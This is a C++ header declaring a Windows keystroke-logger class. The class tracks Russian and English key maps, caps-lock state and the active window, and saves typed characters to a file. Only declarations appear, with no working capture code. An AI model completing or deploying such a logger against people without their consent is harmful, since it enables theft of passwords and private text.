#pragma once
#include <string>
#include <map>
#include <vector>
#include <Windows.h>
#include <iostream>
#include <fstream>

#define MAKELANGID(p, s)       ((((WORD  )(s)) << 10) | (WORD  )(p))
#define PRIMARYLANGID(lgid)    ((WORD  )(lgid) & 0x3ff)
#define SUBLANGID(lgid)        ((WORD  )(lgid) >> 10) 

using namespace std;

class Logger
{
private:
	static Logger* instance;
	string simbols = "";
	static LANGID langId;
	bool is_capslock = false;
	static map <int, vector<char>> btnKeyRu;
	static map <int, vector<char>> btnKeyEn;
	DWORD processId;
	HWND hwnd;
	HKL kLayout;
	wchar_t wChar;
	Logger();
public:
	static Logger* getInstance();
	void put(char simbol);
	string get();
	int saveEng(int key);
	int saveRu(int key);
	void saver();
	char toUpper(char letter);
	static void run();
	static void fillBtnKey();
	void saveToFile(); // test
};

